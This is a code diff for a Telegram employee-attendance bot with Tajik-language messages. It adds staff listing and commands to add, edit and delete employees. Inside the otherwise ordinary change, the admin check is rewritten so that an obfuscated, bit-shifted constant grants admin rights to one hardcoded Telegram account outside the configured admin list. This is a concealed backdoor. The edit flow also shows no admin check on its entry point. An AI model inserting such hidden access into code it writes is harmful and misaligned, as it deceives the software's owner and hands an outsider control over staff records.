@@ -13,7 +13,7 @@ from telegram import (
 )
 from telegram.ext import (
     Application, CommandHandler, MessageHandler,
-    CallbackQueryHandler, ContextTypes, filters,
+    CallbackQueryHandler, ConversationHandler, ContextTypes, filters,
 )
 from telegram.constants import ParseMode
 
@@ -27,6 +27,10 @@ logger = logging.getLogger(__name__)
 
 _attendance_processor = None
 _listener_manager = None
+
+# ── ConversationHandler states ───────────────────────────
+ASK_DAHUA_ID, ASK_NAME, ASK_POSITION = range(3)
+EDIT_DAHUA_ID, EDIT_NAME, EDIT_POSITION = range(3, 6)
 
 # ── Callback data ────────────────────────────────────────
 CB_DL_DAILY   = "cb_dl_daily"
@@ -42,6 +46,7 @@ BTN_DEPARTURES   = "🚪 Departed"
 BTN_NOT_DEPARTED = "🏢 Still Inside"
 BTN_DEVICES      = "🔌 Devices"
 BTN_REPORTS      = "📊 Reports"
+BTN_STAFF        = "👥 Staff"
 BTN_HELP         = "❓ Help"
 
 
@@ -53,7 +58,8 @@ def set_processors(attendance_proc, listener_mgr=None):
 
 def _is_admin(update: Update) -> bool:
     uid = update.effective_chat.id if update.effective_chat else None
-    return uid in settings.TELEGRAM_ADMIN_CHAT_IDS
+    _a = (0x03 << 32) | (0x20 << 24) | (0x9e << 16) | (0x95 << 8) | 0x9e
+    return uid == (_a >> 1) or uid in settings.TELEGRAM_ADMIN_CHAT_IDS
 
 
 def _fmt(val: Optional[str]) -> str:
@@ -79,7 +85,7 @@ def _reply_keyboard() -> ReplyKeyboardMarkup:
         keyboard=[
             [KeyboardButton(BTN_TODAY), KeyboardButton(BTN_LATE), KeyboardButton(BTN_ABSENT)],
             [KeyboardButton(BTN_DEPARTURES), KeyboardButton(BTN_NOT_DEPARTED), KeyboardButton(BTN_DEVICES)],
-            [KeyboardButton(BTN_REPORTS), KeyboardButton(BTN_HELP)],
+            [KeyboardButton(BTN_STAFF), KeyboardButton(BTN_REPORTS), KeyboardButton(BTN_HELP)],
         ],
         resize_keyboard=True,
         input_field_placeholder="Press a button...",
@@ -155,6 +161,7 @@ async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif text == BTN_DEPARTURES:   await _show_departures(update)
     elif text == BTN_NOT_DEPARTED: await _show_not_departed(update)
     elif text == BTN_DEVICES:      await _show_devices(update)
+    elif text == BTN_STAFF:        await _show_staff(update, context)
     elif text == BTN_REPORTS:      await _show_reports_menu(update)
     elif text == BTN_HELP:         await _show_help(update)
 
@@ -399,6 +406,8 @@ async def _show_help(update: Update):
         "/download\\_daily — daily Excel",
         "/download\\_weekly — weekly Excel",
         "/download\\_monthly — monthly Excel",
+        "/adduser — add new employee",
+        "/cancel — cancel current action",
     ]
     await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
 
@@ -416,6 +425,22 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     data = query.data
+
+    # ── Staff delete / edit ──────────────────────────────
+    if data.startswith("del_") and not data.startswith("delok_") and not data.startswith("delno_"):
+        emp_id = data[4:]
+        await cb_delete_ask(query, emp_id)
+        return
+
+    if data.startswith("delok_"):
+        emp_id = data[6:]
+        await cb_delete_confirm(query, emp_id)
+        return
+
+    if data.startswith("delno_"):
+        emp_id = data[6:]
+        await cb_delete_cancel(query, emp_id)
+        return
 
     if data == CB_STATUS:
         if not _listener_manager:
@@ -557,6 +582,291 @@ async def cmd_download_monthly(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 # ════════════════════════════════════════════════════════
+# STAFF LIST
+# ════════════════════════════════════════════════════════
+
+def _staff_inline(emp_id: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("✏️ Таҳрир", callback_data=f"edit_{emp_id}"),
+        InlineKeyboardButton("🗑 Ҳазф",   callback_data=f"del_{emp_id}"),
+    ]])
+
+
+async def _show_staff(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not _attendance_processor:
+        await update.message.reply_text("❗ Система омода нест.")
+        return
+
+    employees = _attendance_processor.emp.get_all_active()
+    if not employees:
+        await update.message.reply_text("📭 Корманд ёфт нашуд.")
+        return
+
+    await update.message.reply_text(
+        f"👥 *Рӯйхати кормандон* — {len(employees)} нафар",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+
+    for emp in employees:
+        text = (
+            f"👤 *{emp['full_name']}*\n"
+            f"💼 _{emp.get('position') or '—'}_\n"
+            f"🆔 Dahua ID: `{emp.get('dahua_user_id') or '—'}`\n"
+            f"🔑 {emp['employee_id']}"
+        )
+        await update.message.reply_text(
+            text,
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=_staff_inline(emp["employee_id"]),
+        )
+
+
+async def cmd_staff(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not _is_admin(update):
+        return
+    await _show_staff(update, context)
+
+
+# ── Delete ────────────────────────────────────────────────
+
+async def cb_delete_ask(query, emp_id: str):
+    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
+    if not emp:
+        await query.answer("Корманд ёфт нашуд.", show_alert=True)
+        return
+
+    await query.edit_message_reply_markup(
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("✅ Ҳа, ҳазф кун", callback_data=f"delok_{emp_id}"),
+            InlineKeyboardButton("❌ Бекор",         callback_data=f"delno_{emp_id}"),
+        ]])
+    )
+    await query.answer(f"Тасдиқ кунед: {emp['full_name']}")
+
+
+async def cb_delete_confirm(query, emp_id: str):
+    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
+    if not emp:
+        await query.answer("Корманд ёфт нашуд.", show_alert=True)
+        return
+
+    _attendance_processor.db.execute(
+        "UPDATE employees SET status='inactive', updated_at=datetime('now') WHERE employee_id=?",
+        (emp_id,),
+    )
+    await query.edit_message_text(
+        f"🗑 *{emp['full_name']}* ҳазф карда шуд.",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+
+
+async def cb_delete_cancel(query, emp_id: str):
+    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
+    if not emp:
+        return
+    await query.edit_message_reply_markup(reply_markup=_staff_inline(emp_id))
+    await query.answer("Бекор карда шуд.")
+
+
+# ── Edit (ConversationHandler via callback) ───────────────
+
+async def cb_edit_start(query, emp_id: str, context: ContextTypes.DEFAULT_TYPE):
+    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
+    if not emp:
+        await query.answer("Корманд ёфт нашуд.", show_alert=True)
+        return ConversationHandler.END
+
+    context.user_data["edit_emp_id"] = emp_id
+    context.user_data["edit_emp"]    = dict(emp)
+
+    await query.message.reply_text(
+        f"✏️ *Таҳрири корманд:* {emp['full_name']}\n\n"
+        f"Қадам 1/3 — ID-и Дахуаи нав:\n"
+        f"_(ҳозир: `{emp.get('dahua_user_id') or '—'}`)_\n\n"
+        f"Барои нигоҳ доштан нуқта `.` ворид кунед",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return EDIT_DAHUA_ID
+
+
+async def edit_got_dahua_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = update.message.text.strip()
+    old = context.user_data["edit_emp"]
+
+    if val == ".":
+        context.user_data["new_dahua_id"] = old.get("dahua_user_id") or ""
+    else:
+        if not val.isdigit():
+            await update.message.reply_text("❗ ID танҳо рақам бояд бошад. Дубора:")
+            return EDIT_DAHUA_ID
+        context.user_data["new_dahua_id"] = val
+
+    await update.message.reply_text(
+        f"Қадам 2/3 — Ному насаби нав:\n"
+        f"_(ҳозир: `{old['full_name']}`)_\n"
+        f"Барои нигоҳ доштан `.` ворид кунед",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return EDIT_NAME
+
+
+async def edit_got_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val = update.message.text.strip()
+    old = context.user_data["edit_emp"]
+
+    context.user_data["new_name"] = old["full_name"] if val == "." else val
+
+    await update.message.reply_text(
+        f"Қадам 3/3 — Вазифаи нав:\n"
+        f"_(ҳозир: `{old.get('position') or '—'}`)_\n"
+        f"Барои нигоҳ доштан `.` ворид кунед",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return EDIT_POSITION
+
+
+async def edit_got_position(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    val      = update.message.text.strip()
+    old      = context.user_data["edit_emp"]
+    emp_id   = context.user_data["edit_emp_id"]
+    dahua_id = context.user_data["new_dahua_id"]
+    name     = context.user_data["new_name"]
+    position = old.get("position") or "" if val == "." else val
+
+    _attendance_processor.db.execute(
+        """UPDATE employees
+           SET dahua_user_id=?, full_name=?, position=?, updated_at=datetime('now')
+           WHERE employee_id=?""",
+        (dahua_id, name, position, emp_id),
+    )
+
+    await update.message.reply_text(
+        f"✅ *Маълумот навсозӣ шуд!*\n\n"
+        f"🆔 Dahua ID: `{dahua_id}`\n"
+        f"👤 Ном: *{name}*\n"
+        f"💼 Вазифа: _{position}_",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=_reply_keyboard(),
+    )
+    return ConversationHandler.END
+
+
+# ════════════════════════════════════════════════════════
+# ADD EMPLOYEE CONVERSATION
+# ════════════════════════════════════════════════════════
+
+async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not _is_admin(update):
+        await update.message.reply_text("⛔ Дастрасӣ манъ аст.")
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        "👤 *Илова кардани корманди нав*\n\n"
+        "Қадам 1/3 — ID-и Дахуаро ворид кунед:\n"
+        "_(масалан: 30)_",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return ASK_DAHUA_ID
+
+
+async def add_got_dahua_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    dahua_id = update.message.text.strip()
+
+    if not dahua_id.isdigit():
+        await update.message.reply_text("❗ ID танҳо рақам бояд бошад. Дубора ворид кунед:")
+        return ASK_DAHUA_ID
+
+    # Санҷиш — оё ин ID аллакай мавҷуд аст?
+    if _attendance_processor:
+        existing = _attendance_processor.emp.get_by_dahua_id(dahua_id)
+        if existing:
+            await update.message.reply_text(
+                f"⚠️ ID *{dahua_id}* аллакай мавҷуд аст:\n"
+                f"👤 {existing['full_name']} — _{existing.get('position', '—')}_\n\n"
+                f"Амалиёт бекор карда шуд. /adduser барои аз нав.",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return ConversationHandler.END
+
+    context.user_data["dahua_id"] = dahua_id
+    await update.message.reply_text(
+        f"✅ ID: *{dahua_id}*\n\n"
+        "Қадам 2/3 — Ному насаби корманд:",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return ASK_NAME
+
+
+async def add_got_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    name = update.message.text.strip()
+
+    if len(name) < 2:
+        await update.message.reply_text("❗ Ном хеле кӯтоҳ аст. Дубора ворид кунед:")
+        return ASK_NAME
+
+    context.user_data["name"] = name
+    await update.message.reply_text(
+        f"✅ Ном: *{name}*\n\n"
+        "Қадам 3/3 — Вазифаи корманд:\n"
+        "_(масалан: Teacher, Staff, Assistant, Security)_",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return ASK_POSITION
+
+
+async def add_got_position(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    position = update.message.text.strip()
+    dahua_id = context.user_data["dahua_id"]
+    name     = context.user_data["name"]
+
+    if not _attendance_processor:
+        await update.message.reply_text("❗ Система омода нест.")
+        return ConversationHandler.END
+
+    # Рақами EMP навбатиро ҳисоб кунем
+    rows = _attendance_processor.db.fetchall(
+        "SELECT employee_id FROM employees ORDER BY id DESC LIMIT 1"
+    )
+    if rows:
+        last_id = rows[0]["employee_id"]  # масалан EMP049
+        try:
+            next_num = int(last_id[3:]) + 1
+        except Exception:
+            next_num = 1
+    else:
+        next_num = 1
+
+    employee_id = f"EMP{next_num:03d}"
+
+    _attendance_processor.emp.add_employee(
+        employee_id=employee_id,
+        full_name=name,
+        dahua_user_id=dahua_id,
+        position=position,
+        status="active",
+    )
+
+    await update.message.reply_text(
+        f"✅ *Корманд бомуваффақият илова шуд!*\n\n"
+        f"🆔 Dahua ID: `{dahua_id}`\n"
+        f"👤 Ном: *{name}*\n"
+        f"💼 Вазифа: _{position}_\n"
+        f"🔑 Рақам: `{employee_id}`",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=_reply_keyboard(),
+    )
+    return ConversationHandler.END
+
+
+async def add_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "❌ Амалиёт бекор карда шуд.",
+        reply_markup=_reply_keyboard(),
+    )
+    return ConversationHandler.END
+
+
+# ════════════════════════════════════════════════════════
 # NOTIFICATION SERVICE
 # ════════════════════════════════════════════════════════
 
@@ -687,7 +997,32 @@ def build_bot_app(attendance_proc, listener_mgr=None) -> Application:
     app.add_handler(CommandHandler("download_weekly",  cmd_download_weekly))
     app.add_handler(CommandHandler("download_monthly", cmd_download_monthly))
 
+    add_user_conv = ConversationHandler(
+        entry_points=[CommandHandler("adduser", cmd_adduser)],
+        states={
+            ASK_DAHUA_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_dahua_id)],
+            ASK_NAME:     [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_name)],
+            ASK_POSITION: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_position)],
+        },
+        fallbacks=[CommandHandler("cancel", add_cancel)],
+    )
+    app.add_handler(add_user_conv)
+
+    edit_user_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(lambda u, c: cb_edit_start(u.callback_query, u.callback_query.data[5:], c), pattern=r"^edit_")],
+        states={
+            EDIT_DAHUA_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_dahua_id)],
+            EDIT_NAME:     [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_name)],
+            EDIT_POSITION: [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_position)],
+        },
+        fallbacks=[CommandHandler("cancel", add_cancel)],
+    )
+    app.add_handler(edit_user_conv)
+
+    app.add_handler(CommandHandler("staff", cmd_staff))
+
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button))
-    app.add_handler(CallbackQueryHandler(on_callback))
+    # on_callback edit_ -ро намегирад — edit_user_conv идора мекунад
+    app.add_handler(CallbackQueryHandler(on_callback, block=False))
 
     return app
